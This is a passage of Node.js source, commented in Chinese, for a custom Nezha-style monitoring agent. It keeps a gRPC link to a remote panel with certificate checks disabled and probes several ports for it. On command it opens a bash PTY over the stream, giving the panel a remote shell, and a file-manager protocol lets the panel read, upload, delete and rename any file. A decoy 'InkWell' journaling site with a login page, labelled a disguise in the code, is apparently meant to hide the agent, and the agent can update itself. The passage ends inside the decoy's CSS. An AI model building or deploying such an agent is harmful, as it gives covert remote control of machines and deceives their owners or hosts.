        const ioStream = nezhaPureOpenStream(
            nezhaPureH2Session,
            '/proto.NezhaService/IOStream',
            currentAuthHeaders,
            (frameData) => {
                try {
                    let inputData = null;
                    let off = 0;
                    while (off < frameData.length) {
                        const tag = PB.decodeVarint(frameData, off);
                        off = tag.off;
                        const fieldNum = tag.val >> 3;
                        const wireType = tag.val & 0x07;
                        if (wireType === 2 && fieldNum === 1) {
                            const len = PB.decodeVarint(frameData, off);
                            off = len.off;
                            inputData = frameData.slice(off, off + len.val);
                            off += len.val;
                        } else if (wireType === 0) {
                            const val = PB.decodeVarint(frameData, off);
                            off = val.off;
                        } else { break; }
                    }
                    const term = nezhaPureActiveTerminals.get(terminalKey);
                    if (!inputData || !term) return;
                    if (inputData.length === 0) return;
                    const dataType = inputData[0];
                    const payload = inputData.slice(1);
                    if (dataType === 0) {
                        if (term.pty.stdin.writable) {
                            term.pty.stdin.write(payload);
                        }
                    } else if (dataType === 1) {
                        try {
                            const resize = JSON.parse(payload.toString('utf8'));
                            if (term.pty.stdout && term.pty.stdout._handle && term.pty.stdout._handle.setWindowSize) {
                                term.pty.stdout._handle.setWindowSize(resize.Cols || 80, resize.Rows || 24);
                            }
                        } catch(e) {}
                    }
                } catch(e) {}
            },
            (trailers) => {
                const term = nezhaPureActiveTerminals.get(terminalKey);
                if (term) {
                    try { term.pty.kill(); } catch(e) {}
                    if (term.keepaliveTimer) clearInterval(term.keepaliveTimer);
                    if (term.rcFile) { try { fs.unlinkSync(term.rcFile); } catch(e) {} }
                    nezhaPureActiveTerminals.delete(terminalKey);
                }
            }
        );

        // 发送握手: magic + streamId
        try {
            const magic = Buffer.from([0xff, 0x05, 0xff, 0x05]);
            const streamIdBuf = Buffer.from(streamId);
            const handshake = Buffer.concat([magic, streamIdBuf]);
            const handshakeMsg = PB.bytes(1, handshake);
            ioStream.write(PB.frame(handshakeMsg));
        } catch(e) {}

        // 选择 shell 并创建 PTY
        const _hasBash = fs.existsSync('/bin/bash');
        const shell = _hasBash ? '/bin/bash' : (process.env.SHELL || '/bin/sh');
        let _termRcFile = null;
        if (_hasBash) {
            try {
                const bashRcParts = [
                    '[ -f /etc/profile ] && . /etc/profile 2>/dev/null',
                    '[ -f /etc/bash.bashrc ] && . /etc/bash.bashrc 2>/dev/null',
                    '[ -f ~/.bashrc ] && . ~/.bashrc 2>/dev/null',
                ];
                const BS = String.fromCharCode(92);
                const SQ = String.fromCharCode(39);
                const ps1Val = BS + '[' + BS + 'e]0;' + BS + 'u@' + BS + 'h:' + BS + 'w' + BS + 'a' + BS + ']' +
                    BS + '[' + BS + 'e[01;32m' + BS + ']' + BS + 'u@' + BS + 'h' +
                    BS + '[' + BS + 'e[00m' + BS + ']:' +
                    BS + '[' + BS + 'e[01;34m' + BS + ']' + BS + 'w' +
                    BS + '[' + BS + 'e[00m' + BS + ']' + BS + '$ ';
                bashRcParts.push('export PS1=' + SQ + ps1Val + SQ);
                const rcContent = bashRcParts.join('\n');
                _termRcFile = path.join(os.tmpdir(), '.nezha_rc_' + streamId);
                fs.writeFileSync(_termRcFile, rcContent);
            } catch(e) { _termRcFile = null; }
        }
        let pty;
        try {
            const bashCmd = _termRcFile
                ? '/bin/bash --rcfile ' + _termRcFile
                : shell;
            pty = spawn('/usr/bin/script', ['-qfc', bashCmd, '/dev/null'], {
                env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
                stdio: ['pipe', 'pipe', 'pipe'],
            });
        } catch(e) {
            try {
                pty = spawn(shell, ['-i'], {
                    env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
                    stdio: ['pipe', 'pipe', 'pipe'],
                });
            } catch(e2) {
                pty = spawn('/bin/sh', ['-i'], {
                    env: { ...process.env, TERM: 'xterm-256color', COLUMNS: '80', LINES: '24', HOME: process.env.HOME || '/root' },
                    stdio: ['pipe', 'pipe', 'pipe'],
                });
            }
        }

        const keepaliveTimer = setInterval(() => {
            try {
                if (ioStream && !ioStream.destroyed && ioStream.writable) {
                    ioStream.write(PB.frame(PB.bytes(1, Buffer.alloc(0))));
                } else {
                    clearInterval(keepaliveTimer);
                }
            } catch(e) { clearInterval(keepaliveTimer); }
        }, 30000);
        const terminal = { stream: ioStream, pty, keepaliveTimer, rcFile: _termRcFile };
        nezhaPureActiveTerminals.set(terminalKey, terminal);
        const sendOutput = (data) => {
            try {
                if (ioStream && !ioStream.destroyed && ioStream.writable) {
                    const ioData = PB.bytes(1, data);
                    ioStream.write(PB.frame(ioData));
                }
            } catch(e) {}
        };
        pty.stdout.on('data', sendOutput);
        pty.stderr.on('data', sendOutput);
        pty.on('exit', () => {
            try { ioStream.end(); } catch(e) {}
            clearInterval(keepaliveTimer);
            nezhaPureActiveTerminals.delete(terminalKey);
            if (_termRcFile) { try { fs.unlinkSync(_termRcFile); } catch(e) {} }
        });
    } catch(e) {}
}

// ==================== 文件管理任务 (taskType 6, 通过 IOStream 自定义协议) ====================
function handleFMTask(taskId, taskData) {
    try {
        let streamId = '';
        try {
            const parsed = JSON.parse(taskData);
            streamId = parsed.StreamID || parsed.streamID || parsed.stream_id || '';
        } catch(e) {
            streamId = taskData;
        }
        if (!streamId) return;
        if (nezhaPureActiveFMSessions.has(streamId)) return;

        const ioStream = nezhaPureOpenStream(
            nezhaPureH2Session,
            '/proto.NezhaService/IOStream',
            currentAuthHeaders,
            (frameData) => {
                try {
                    let data = null;
                    let off = 0;
                    while (off < frameData.length) {
                        const tag = PB.decodeVarint(frameData, off);
                        off = tag.off;
                        const fieldNum = tag.val >> 3;
                        const wireType = tag.val & 0x07;
                        if (wireType === 2 && fieldNum === 1) {
                            const len = PB.decodeVarint(frameData, off);
                            off = len.off;
                            data = frameData.slice(off, off + len.val);
                            off += len.val;
                        } else if (wireType === 0) {
                            const val = PB.decodeVarint(frameData, off);
                            off = val.off;
                        } else { break; }
                    }
                    if (!data || data.length === 0) return;
                    const fmSession = nezhaPureActiveFMSessions.get(streamId);
                    if (fmSession && fmSession.uploadStream && !fmSession.uploadStream.closed) {
                        fmSession.uploadStream.write(data);
                        fmSession.uploadReceived = (fmSession.uploadReceived || 0) + data.length;
                        if (fmSession.uploadReceived >= fmSession.uploadSize) {
                            fmSession.uploadStream.end();
                            fmSession.uploadStream = null;
                            const nzup = Buffer.from('NZUP');
                            ioStream.write(PB.frame(PB.bytes(1, nzup)));
                        }
                        return;
                    }

                    const cmd = data[0];
                    if (cmd === 0) {
                        const dirPath = data.slice(1).toString('utf8') || '/';
                        fmListDir(ioStream, dirPath);
                    } else if (cmd === 1) {
                        const filePath = data.slice(1).toString('utf8');
                        fmDownloadFile(ioStream, filePath, streamId);
                    } else if (cmd === 2) {
                        fmReceiveUpload(ioStream, data.slice(1), streamId);
                    } else if (cmd === 3) {
                        const delPath = data.slice(1).toString('utf8');
                        fmDeletePath(ioStream, delPath);
                    } else if (cmd === 4) {
                        fmRenamePath(ioStream, data.slice(1));
                    } else if (cmd === 5) {
                        const mkDir = data.slice(1).toString('utf8');
                        fmCreateDir(ioStream, mkDir);
                    }
                } catch(e) {}
            },
            (trailers) => {
                const fm = nezhaPureActiveFMSessions.get(streamId);
                if (fm) {
                    if (fm.keepaliveTimer) clearInterval(fm.keepaliveTimer);
                    if (fm.uploadStream) { try { fm.uploadStream.destroy(); } catch(e) {} }
                    if (fm.downloadStream) { try { fm.downloadStream.destroy(); } catch(e) {} }
                    nezhaPureActiveFMSessions.delete(streamId);
                }
            }
        );

        // 发送握手
        try {
            const magic = Buffer.from([0xff, 0x05, 0xff, 0x05]);
            const streamIdBuf = Buffer.from(streamId);
            const handshake = Buffer.concat([magic, streamIdBuf]);
            ioStream.write(PB.frame(PB.bytes(1, handshake)));
        } catch(e) {}

        const keepaliveTimer = setInterval(() => {
            try {
                if (ioStream && !ioStream.destroyed && ioStream.writable) {
                    ioStream.write(PB.frame(PB.bytes(1, Buffer.alloc(0))));
                } else { clearInterval(keepaliveTimer); }
            } catch(e) { clearInterval(keepaliveTimer); }
        }, 30000);
        nezhaPureActiveFMSessions.set(streamId, { stream: ioStream, keepaliveTimer });
    } catch(e) {}
}

function fmListDir(ioStream, dirPath) {
    try {
        const nzfn = Buffer.from('NZFN');
        const pathBuf = Buffer.from(dirPath, 'utf8');
        const pathLenBuf = Buffer.alloc(4);
        pathLenBuf.writeUInt32BE(pathBuf.length, 0);
        const entryBufs = [];
        let hasError = false;
        let errData = null;
        try {
            const items = fs.readdirSync(dirPath, { withFileTypes: true });
            for (const item of items) {
                try {
                    const isDir = item.isDirectory() ? 1 : 0;
                    const nameBuf = Buffer.from(item.name, 'utf8');
                    if (nameBuf.length <= 255) {
                        entryBufs.push(Buffer.from([isDir, nameBuf.length]));
                        entryBufs.push(nameBuf);
                    }
                } catch(e) {}
            }
        } catch(e) {
            hasError = true;
            const nerr = Buffer.from('NERR');
            const errMsg = Buffer.from(e.message || 'Permission denied', 'utf8');
            errData = Buffer.concat([nerr, errMsg]);
        }

        if (hasError) {
            const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf, errData]);
            ioStream.write(PB.frame(PB.bytes(1, msgData)));
        } else if (entryBufs.length > 0) {
            const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf, ...entryBufs]);
            ioStream.write(PB.frame(PB.bytes(1, msgData)));
        } else {
            const msgData = Buffer.concat([nzfn, pathLenBuf, pathBuf]);
            ioStream.write(PB.frame(PB.bytes(1, msgData)));
        }
    } catch(e) {}
}

function fmDownloadFile(ioStream, filePath, streamId) {
    try {
        let stat;
        try {
            stat = fs.statSync(filePath);
            if (stat.isDirectory()) throw new Error('Is a directory');
        } catch(e) {
            const nerr = Buffer.from('NERR');
            const errMsg = Buffer.from(e.message || 'File not found', 'utf8');
            ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
            return;
        }

        const nztd = Buffer.from('NZTD');
        const sizeBuf = Buffer.alloc(8);
        sizeBuf.writeUInt32BE(Math.floor(stat.size / 0x100000000), 0);
        sizeBuf.writeUInt32BE(stat.size & 0xFFFFFFFF, 4);
        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nztd, sizeBuf]))));
        const readStream = fs.createReadStream(filePath, { highWaterMark: 1024 * 1024 });
        const fmSession = nezhaPureActiveFMSessions.get(streamId);
        if (fmSession) fmSession.downloadStream = readStream;
        readStream.on('data', (chunk) => {
            try {
                if (ioStream && !ioStream.destroyed && ioStream.writable) {
                    ioStream.write(PB.frame(PB.bytes(1, chunk)));
                } else {
                    readStream.destroy();
                }
            } catch(e) { readStream.destroy(); }
        });
        readStream.on('error', () => {
            if (fmSession) fmSession.downloadStream = null;
        });
        readStream.on('end', () => {
            if (fmSession) fmSession.downloadStream = null;
        });
    } catch(e) {}
}

function fmReceiveUpload(ioStream, initialData, streamId) {
    try {
        if (initialData.length < 8) return;
        const fileSizeHigh = initialData.readUInt32BE(0);
        const fileSizeLow = initialData.readUInt32BE(4);
        const fileSize = fileSizeHigh * 0x100000000 + fileSizeLow;
        const filePath = initialData.slice(8).toString('utf8');
        if (!filePath) return;
        const dir = path.dirname(filePath);
        try { fs.mkdirSync(dir, { recursive: true }); } catch(e) {}
        const writeStream = fs.createWriteStream(filePath);
        const fmSession = nezhaPureActiveFMSessions.get(streamId);
        if (fmSession) {
            fmSession.uploadStream = writeStream;
            fmSession.uploadSize = fileSize;
            fmSession.uploadReceived = 0;
        }
    } catch(e) {}
}

function fmDeletePath(ioStream, delPath) {
    try {
        if (!delPath) return;
        const stat = fs.statSync(delPath);
        if (stat.isDirectory()) {
            fs.rmSync(delPath, { recursive: true, force: true });
        } else {
            fs.unlinkSync(delPath);
        }
        const nzfn = Buffer.from('NZFN');
        const pathBuf = Buffer.from(path.dirname(delPath), 'utf8');
        const pathLenBuf = Buffer.alloc(4);
        pathLenBuf.writeUInt32BE(pathBuf.length, 0);
        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nzfn, pathLenBuf, pathBuf]))));
    } catch(e) {
        const nerr = Buffer.from('NERR');
        const errMsg = Buffer.from(e.message || '删除失败', 'utf8');
        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
    }
}

function fmRenamePath(ioStream, payload) {
    try {
        if (payload.length < 4) return;
        const oldPathLen = payload.readUInt32BE(0);
        if (payload.length < 4 + oldPathLen) return;
        const oldPath = payload.slice(4, 4 + oldPathLen).toString('utf8');
        const newPath = payload.slice(4 + oldPathLen).toString('utf8');
        if (!oldPath || !newPath) return;
        fs.renameSync(oldPath, newPath);
        fmListDir(ioStream, path.dirname(newPath));
    } catch(e) {
        const nerr = Buffer.from('NERR');
        const errMsg = Buffer.from(e.message || '重命名失败', 'utf8');
        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
    }
}

function fmCreateDir(ioStream, dirPath) {
    try {
        if (!dirPath) return;
        fs.mkdirSync(dirPath, { recursive: true });
        fmListDir(ioStream, dirPath);
    } catch(e) {
        const nerr = Buffer.from('NERR');
        const errMsg = Buffer.from(e.message || '创建目录失败', 'utf8');
        ioStream.write(PB.frame(PB.bytes(1, Buffer.concat([nerr, errMsg]))));
    }
}

// ==================== 端口探测 ====================
function probeGrpcPort(host, port, useTls) {
    return new Promise((resolve) => {
        const url = useTls ? `https://${host}:${port}` : `http://${host}:${port}`;
        const h2Opts = useTls ? { rejectUnauthorized: false, settings: { enablePush: false } } : { settings: { enablePush: false } };
        const connectTimeout = 4000;
        const timer = setTimeout(() => { try { session.close(); } catch(e) {} resolve(false); }, connectTimeout);
        let settled = false;
        let session;
        try { session = http2.connect(url, h2Opts); } catch(e) { clearTimeout(timer); resolve(false); return; }
        session.on('connect', () => {
            if (settled) return; settled = true;
            clearTimeout(timer);
            try {
                const testStream = session.request({
                    ':method': 'POST',
                    ':path': '/proto.NezhaService/ReportSystemInfo',
                    'content-type': 'application/grpc',
                    'te': 'trailers',
                });
                const streamTimeout = setTimeout(() => {
                    try { testStream.close(http2.constants.HTTP2_STREAM_CANCEL); } catch(e) {}
                    try { session.close(); } catch(e) {}
                    resolve(true);
                }, 2000);
                testStream.on('response', (headers) => {
                    clearTimeout(streamTimeout);
                    const status = parseInt(headers[':status']) || 0;
                    try { testStream.close(http2.constants.HTTP2_STREAM_CANCEL); } catch(e) {}
                    try { session.close(); } catch(e) {}
                    resolve(status === 200 || status === 401 || status === 403);
                });
                testStream.on('error', (err) => {
                    clearTimeout(streamTimeout);
                    const code = err.code || '';
                    const ok = code === 'ERR_HTTP2_STREAM_ERROR' || code === 'ECONNRESET' ||
                        err.message.includes('RST_STREAM') || err.message.includes('refused');
                    try { session.close(); } catch(e) {}
                    resolve(ok);
                });
                testStream.end(Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00]));
            } catch(e) {
                try { session.close(); } catch(e2) {}
                resolve(false);
            }
        });
        session.on('error', () => {
            if (settled) return; settled = true;
            clearTimeout(timer);
            resolve(false);
        });
    });
}

async function detectGrpcPort(host, originalPort, tls) {
    const candidates = [];
    candidates.push({ port: originalPort, useTls: tls, label: `用户指定 ${originalPort}/${tls ? 'TLS' : '明文'}` });
    if (originalPort !== 443 || !tls) candidates.push({ port: 443, useTls: true, label: '443/TLS' });
    if (originalPort !== 80 || tls) candidates.push({ port: 80, useTls: false, label: '80/明文' });
    candidates.push({ port: 2053, useTls: true, label: '2053/TLS (CF gRPC)' });
    candidates.push({ port: 8443, useTls: true, label: '8443/TLS (CF gRPC)' });
    const vpsPorts = [
        { port: 5555, useTls: false, label: '5555/明文 (哪吒默认)' },
        { port: 5555, useTls: true, label: '5555/TLS' },
        { port: 8008, useTls: false, label: '8008/明文' },
        { port: 8008, useTls: true, label: '8008/TLS' },
    ];
    for (const v of vpsPorts) {
        if (!candidates.some(c => c.port === v.port && c.useTls === v.useTls)) candidates.push(v);
    }
    for (const candidate of candidates) {
        try {
            const ok = await probeGrpcPort(host, candidate.port, candidate.useTls);
            if (ok) {
                console.log(`[Nezha] 端口探测成功: ${host}:${candidate.port}/${candidate.useTls ? 'TLS' : '明文'} (${candidate.label})`);
                return { port: candidate.port, tls: candidate.useTls };
            }
        } catch(e) {}
    }
    console.log(`[Nezha] 所有端口探测失败，使用默认: ${originalPort}/${tls ? 'TLS' : '明文'}`);
    return { port: originalPort, tls: tls };
}

// ==================== 会话管理 ====================
function cleanupSession() {
    sessionAlive = false;
    isReconnecting = true;
    if (reconnectTimer) { clearTimeout(reconnectTimer); reconnectTimer = null; }
    if (reopenTimer) { clearTimeout(reopenTimer); reopenTimer = null; }
    if (stateTimer) { clearInterval(stateTimer); stateTimer = null; }
    if (geoipTimer) { clearInterval(geoipTimer); geoipTimer = null; }
    if (hostTimer) { clearInterval(hostTimer); hostTimer = null; }
    if (pingTimer) { clearInterval(pingTimer); pingTimer = null; }

    // 清理所有活动的终端会话
    for (const [key, term] of nezhaPureActiveTerminals.entries()) {
        try {
            if (term.keepaliveTimer) clearInterval(term.keepaliveTimer);
            try { term.pty.kill(); } catch(e) {}
            try { term.stream.end(); } catch(e) {}
            if (term.rcFile) { try { fs.unlinkSync(term.rcFile); } catch(e) {} }
        } catch(e) {}
    }
    nezhaPureActiveTerminals.clear();

    // 清理所有活动的文件管理会话
    for (const [key, fm] of nezhaPureActiveFMSessions.entries()) {
        try {
            if (fm.keepaliveTimer) clearInterval(fm.keepaliveTimer);
            if (fm.uploadStream) { try { fm.uploadStream.destroy(); } catch(e) {} }
            if (fm.downloadStream) { try { fm.downloadStream.destroy(); } catch(e) {} }
            try { fm.stream.end(); } catch(e) {}
        } catch(e) {}
    }
    nezhaPureActiveFMSessions.clear();

    if (stateStream) {
        try { stateStream.removeAllListeners(); stateStream.end(); } catch(e) {}
        stateStream = null;
    }
    if (taskStream) {
        try { taskStream.removeAllListeners(); taskStream.end(); } catch(e) {}
        taskStream = null;
    }
    if (h2session) {
        try { h2session.removeAllListeners(); h2session.destroy(); } catch(e) {}
        h2session = null;
    }
    nezhaPureH2Session = null;
    setTimeout(() => { isReconnecting = false; }, 2000);
}

function scheduleReconnect(reason) {
    if (!running || isReconnecting) return;
    const stack = new Error().stack.split('\n').slice(1, 4).map(s => s.trim()).join(' <- ');
    console.error(`[Nezha] 触发重连 (原因: ${reason || '未知'}) 调用链: ${stack}`);
    isReconnecting = true;
    cleanupSession();
    restartAttempts++;
    const baseDelay = restartAttempts <= 1 ? 3000 : Math.min(30000 * Math.pow(2, Math.min(restartAttempts - 2, 4)), 300000);
    const jitter = Math.floor(baseDelay * (0.7 + Math.random() * 0.6));
    console.log(`[Nezha] 将在 ${(jitter / 1000).toFixed(1)}s 后重连 (第${restartAttempts}次)`);
    reconnectTimer = setTimeout(() => {
        reconnectTimer = null;
        isReconnecting = false;
        connectInternal();
    }, jitter);
}

function reopenStreams(reason) {
    if (!running || isReconnecting) return;
    if (!h2session || h2session.destroyed || h2session.closed) {
        console.error(`[Nezha] ${reason}，但 h2session 已死，走全量重连`);
        scheduleReconnect('h2session dead: ' + reason);
        return;
    }
    if (reopenTimer) return;
    console.log(`[Nezha] ${reason}，重开流...`);

    reopenTimer = setTimeout(() => {
        reopenTimer = null;
        if (!running || !h2session || h2session.destroyed) {
            scheduleReconnect('reopenTimer: h2session dead');
            return;
        }
        const authHeaders = currentAuthHeaders || {
            'client-secret': NZ_SECRET,
            'client-uuid': currentUUID,
            'client_secret': NZ_SECRET,
            'client_uuid': currentUUID,
        };

        if (stateStream) {
            try { stateStream.removeAllListeners(); stateStream.end(); } catch(e) {}
            stateStream = null;
        }
        if (taskStream) {
            try { taskStream.removeAllListeners(); taskStream.end(); } catch(e) {}
            taskStream = null;
        }

        try {
            stateStream = openStream(h2session, '/proto.NezhaService/ReportSystemState', authHeaders,
                () => {},
                () => {
                    if (stateStream) {
                        try { stateStream.removeAllListeners(); } catch(e) {}
                        stateStream = null;
                    }
                    reopenStreams('State 流结束');
                }
            );
            console.log('[Nezha] State 流已重开');
        } catch(e) { console.log(`[Nezha] State 流重开失败: ${e.message}`); }

        try {
            taskStream = openStream(h2session, '/proto.NezhaService/RequestTask', authHeaders,
                (data) => { handleTaskData(data); },
                () => {
                    if (taskStream) {
                        try { taskStream.removeAllListeners(); } catch(e) {}
                        taskStream = null;
                    }
                    reopenStreams('Task 流结束');
                }
            );
            // 发送初始空帧启动 Task 流
            try { taskStream.write(PB.frame(Buffer.alloc(0))); } catch(e) {}
            console.log('[Nezha] Task 流已重开（已发送初始帧）');
        } catch(e) { console.log(`[Nezha] Task 流重开失败: ${e.message}`); }

        startTimersIfNeeded();
    }, 500);
}

function startTimersIfNeeded() {
    if (!stateTimer) {
        stateTimer = setInterval(() => {
            try {
                if (!running || !h2session || h2session.destroyed) return;
                if (!stateStream || stateStream.destroyed || stateStream.closed) {
                    reopenStreams('State 流不可写');
                    return;
                }
                const state = collectState();
                stateStream.write(PB.frame(NezhaMsg.encodeState(state)));
            } catch(e) {
                console.log(`[Nezha] State 上报失败: ${e.message}`);
                if (stateStream) {
                    try { stateStream.removeAllListeners(); } catch(e2) {}
                    stateStream = null;
                }
                reopenStreams('State 上报写入失败');
            }
        }, REPORT_DELAY * 1000);
    }
    if (!geoipTimer) {
        geoipTimer = setInterval(async () => {
            try {
                if (!running || !h2session || h2session.destroyed) return;
                const ip = await getPublicIP();
                if (ip) {
                    currentIP = ip;
                    const authHeaders = { 'client-secret': NZ_SECRET, 'client-uuid': currentUUID, 'client_secret': NZ_SECRET, 'client_uuid': currentUUID };
                    await sendUnary(h2session, '/proto.NezhaService/ReportGeoIP', NezhaMsg.encodeGeoIP(ip, ''), authHeaders);
                }
            } catch(e) {}
        }, GEOIP_PERIOD * 1000);
    }
    if (!hostTimer) {
        hostTimer = setInterval(async () => {
            try {
                if (!running || !h2session || h2session.destroyed) return;
                const hi = collectHost();
                const authHeaders = { 'client-secret': NZ_SECRET, 'client-uuid': currentUUID, 'client_secret': NZ_SECRET, 'client_uuid': currentUUID };
                await sendUnary(h2session, '/proto.NezhaService/ReportSystemInfo2', NezhaMsg.encodeHost(hi), authHeaders);
            } catch(e) {}
        }, HOST_PERIOD * 1000);
    }
    if (!pingTimer) {
        pingTimer = setInterval(() => {
            try {
                if (!running || !h2session || h2session.destroyed) return;
                h2session.ping(Buffer.alloc(8), (err, duration) => {
                    if (err) {
                        console.error(`[Nezha] PING 无响应: ${err.message}`);
                        scheduleReconnect('ping no response: ' + err.message);
                    }
                });
            } catch(e) {
                console.error(`[Nezha] PING 失败: ${e.message}`);
                scheduleReconnect('ping failed: ' + e.message);
            }
        }, PING_PERIOD * 1000);
    }
}

// ==================== 核心连接 ====================
async function connectInternal() {
    if (!running) return;

    try {
        const addrParts = NZ_SERVER.split(':');
        const host = addrParts[0];
        const originalPort = parseInt(addrParts[1]) || (NZ_TLS ? 443 : 5555);

        const detected = await detectGrpcPort(host, originalPort, NZ_TLS);
        const port = detected.port;
        const useTls = detected.tls;

        const connectURL = useTls ? `https://${host}:${port}` : `http://${host}:${port}`;
        const h2Opts = useTls ? { rejectUnauthorized: false, settings: { enablePush: false } } : { settings: { enablePush: false } };

        h2session = http2.connect(connectURL, h2Opts);

        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => reject(new Error('连接超时')), 10000);
            const connectErrorHandler = (err) => { clearTimeout(timeout); reject(err); };
            h2session.on('connect', () => {
                clearTimeout(timeout);
                h2session.removeListener('error', connectErrorHandler);
                resolve();
            });
            h2session.on('error', connectErrorHandler);
        });

        // 同步全局别名，供 IOStream 任务使用
        nezhaPureH2Session = h2session;
        currentAuthHeaders = {
            'client-secret': NZ_SECRET,
            'client-uuid': currentUUID,
            'client_secret': NZ_SECRET,
            'client_uuid': currentUUID,
        };

        console.log(`[Nezha] HTTP/2 连接成功: ${host}:${port}/${useTls ? 'TLS' : '明文'}`);

        h2session.on('error', (err) => {
            console.error(`[Nezha] HTTP/2 会话错误: ${err.message} (code=${err.code})`);
            sessionAlive = false;
            if (running && !isReconnecting) scheduleReconnect('h2session error: ' + err.message);
        });
        h2session.on('close', () => {
            console.error(`[Nezha] HTTP/2 会话关闭`);
            sessionAlive = false;
            if (running && !isReconnecting) scheduleReconnect('h2session close');
        });
        h2session.on('goaway', (errorCode, lastStreamID) => {
            console.error(`[Nezha] 收到 GOAWAY: errorCode=${errorCode} lastStreamID=${lastStreamID}`);
            sessionAlive = false;
            if (running && !isReconnecting) scheduleReconnect('h2session goaway: ' + errorCode);
        });
        h2session.on('frameError', (frameType, errorCode, streamID) => {
            console.error(`[Nezha] HTTP/2 帧错误: frameType=${frameType} errorCode=${errorCode} streamID=${streamID}`);
        });
        h2session.on('timeout', () => {
            console.error(`[Nezha] HTTP/2 会话超时`);
            sessionAlive = false;
            if (running && !isReconnecting) scheduleReconnect('h2session timeout');
        });

        const authHeaders = currentAuthHeaders;

        // 1. 上报 Host 信息
        const hostInfo = collectHost();
        try {
            await sendUnary(h2session, '/proto.NezhaService/ReportSystemInfo2', NezhaMsg.encodeHost(hostInfo), authHeaders);
            console.log('[Nezha] Host 信息上报成功');
        } catch(e) {
            console.log(`[Nezha] Host 上报失败: ${e.message}`);
        }

        // 2. 上报 GeoIP
        if (currentIP) {
            try {
                await sendUnary(h2session, '/proto.NezhaService/ReportGeoIP', NezhaMsg.encodeGeoIP(currentIP, ''), authHeaders);
                console.log('[Nezha] GeoIP 上报成功');
            } catch(e) {
                console.log(`[Nezha] GeoIP 上报失败: ${e.message}`);
            }
        }

        sessionAlive = true;

        // 3. 打开 State 流
        stateStream = openStream(h2session, '/proto.NezhaService/ReportSystemState', authHeaders,
            () => {},
            () => {
                if (stateStream) {
                    try { stateStream.removeAllListeners(); } catch(e) {}
                    stateStream = null;
                }
                reopenStreams('State 流结束');
            }
        );
        console.log('[Nezha] State 流已打开');

        // 4. 打开 Task 流
        taskStream = openStream(h2session, '/proto.NezhaService/RequestTask', authHeaders,
            (data) => { handleTaskData(data); },
            () => {
                if (taskStream) {
                    try { taskStream.removeAllListeners(); } catch(e) {}
                    taskStream = null;
                }
                reopenStreams('Task 流结束');
            }
        );
        console.log('[Nezha] Task 流已打开（已发送初始帧）');
        try { taskStream.write(PB.frame(Buffer.alloc(0))); } catch(e) {}

        // 5. 启动所有定时器
        startTimersIfNeeded();

        restartAttempts = 0;
        isReconnecting = false;
        console.log('[Nezha] 探针启动完成 ✓');

    } catch(e) {
        console.error(`[Nezha] 连接失败: ${e.message}`);
        if (running) scheduleReconnect('connectInternal failed: ' + e.message);
    }
}

// ==================== 主入口 ====================
async function main() {
    console.log('╔══════════════════════════════════════╗');
    console.log('║  纯 Node.js 哪吒探针 + IOStream v' + AGENT_VERSION + '  ║');
    console.log('╚══════════════════════════════════════╝');
    console.log(`[Nezha] 面板: ${NZ_SERVER} (TLS: ${NZ_TLS})`);

    // 启动前先获取公网 IP
    console.log('[Nezha] 正在获取服务器公网 IP...');
    currentIP = await getPublicIP();
    if (currentIP) {
        console.log(`[Nezha] 公网 IP: ${currentIP}`);
    } else {
        console.log('[Nezha] 无法获取公网 IP，将使用默认值');
    }

    // 根据 IP 生成固定 UUID
    currentUUID = generateIPBasedUUID(currentIP);
    console.log(`[Nezha] 固定 UUID: ${currentUUID}`);

    // 初始化鉴权头
    currentAuthHeaders = {
        'client-secret': NZ_SECRET,
        'client-uuid': currentUUID,
        'client_secret': NZ_SECRET,
        'client_uuid': currentUUID,
    };

    // 启动 InkWell 伪装 Web 应用 (不阻塞主流程)
    try { startInkWell(); } catch(e) { console.log(`[InkWell] 启动失败: ${e.message}`); }

    // 启动一次性自更新
    scheduleSelfUpdate();

    // 启动连接
    await connectInternal();
}

// ==================== 获取探针状态 (供外部调用) ====================
function getNezhaStatus() {
    return {
        running,
        sessionAlive,
        isReconnecting,
        restartAttempts,
        currentUUID,
        currentIP,
        server: NZ_SERVER,
        tls: NZ_TLS,
        agentVersion: AGENT_VERSION,
        h2sessionAlive: !!(h2session && !h2session.destroyed),
        stateStreamAlive: !!(stateStream && !stateStream.destroyed),
        taskStreamAlive: !!(taskStream && !taskStream.destroyed),
        activeTerminals: nezhaPureActiveTerminals.size,
        activeFMSessions: nezhaPureActiveFMSessions.size,
        uptime: Math.floor(os.uptime()),
        timestamp: Date.now(),
    };
}

// ==================== InkWell 伪装 Web 应用 (纯 http, 零依赖) ====================
function loadJournalData() {
    try {
        if (fs.existsSync(INKWELL_DATA_FILE)) {
            return JSON.parse(fs.readFileSync(INKWELL_DATA_FILE, 'utf8'));
        }
    } catch(e) {}
    return { entries: [], nextId: 1 };
}

function saveJournalData(data) {
    try {
        fs.writeFileSync(INKWELL_DATA_FILE, JSON.stringify(data, null, 2));
    } catch(e) {}
}

function htmlEsc(s) {
    return String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function parseCookies(cookieHeader) {
    const cookies = {};
    if (!cookieHeader) return cookies;
    cookieHeader.split(';').forEach(c => {
        const parts = c.trim().split('=');
        if (parts.length >= 2) {
            cookies[parts[0].trim()] = decodeURIComponent(parts.slice(1).join('='));
        }
    });
    return cookies;
}

function makeSessionToken() {
    return crypto.randomBytes(24).toString('hex');
}

const inkwellSessions = new Map();

const INKWELL_LOGIN_PAGE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>InkWell · A quiet place for writers</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: Georgia, 'Times New Roman', serif;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
